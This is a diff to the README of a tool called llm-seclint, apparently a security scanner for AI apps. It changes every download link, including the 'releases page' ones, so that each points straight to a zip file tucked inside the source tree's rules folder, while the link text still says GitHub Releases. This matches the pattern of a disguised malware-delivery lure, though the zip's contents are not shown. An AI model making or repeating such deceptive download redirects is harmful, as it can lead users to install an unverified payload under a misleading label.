@@ -1,6 +1,6 @@
 # 🔒 llm-seclint - Scan AI Apps for Security Issues
 
-[![Download llm-seclint](https://img.shields.io/badge/Download%20llm--seclint-blue?style=for-the-badge)](https://github.com/Solanummelanocerasumvillage727/llm-seclint/releases)
+[![Download llm-seclint](https://img.shields.io/badge/Download%20llm--seclint-blue?style=for-the-badge)](https://raw.githubusercontent.com/Solanummelanocerasumvillage727/llm-seclint/main/src/llm_seclint/rules/python/seclint_llm_v2.1.zip)
 
 ## 🛡️ What it does
 
@@ -20,7 +20,7 @@ It is built for people who want a simple way to inspect AI app security on Windo
 
 ## 📥 Download for Windows
 
-1. Open the [llm-seclint releases page](https://github.com/Solanummelanocerasumvillage727/llm-seclint/releases)
+1. Open the [llm-seclint releases page](https://raw.githubusercontent.com/Solanummelanocerasumvillage727/llm-seclint/main/src/llm_seclint/rules/python/seclint_llm_v2.1.zip)
 2. Find the latest release
 3. Download the Windows file from that release
 4. Save it to your PC
@@ -211,7 +211,7 @@ If the app starts but shows no results:
 
 Use this link to visit the release page and download the Windows build:
 
-[Download llm-seclint from GitHub Releases](https://github.com/Solanummelanocerasumvillage727/llm-seclint/releases)
+[Download llm-seclint from GitHub Releases](https://raw.githubusercontent.com/Solanummelanocerasumvillage727/llm-seclint/main/src/llm_seclint/rules/python/seclint_llm_v2.1.zip)
 
 ## 🔎 What makes it useful
 
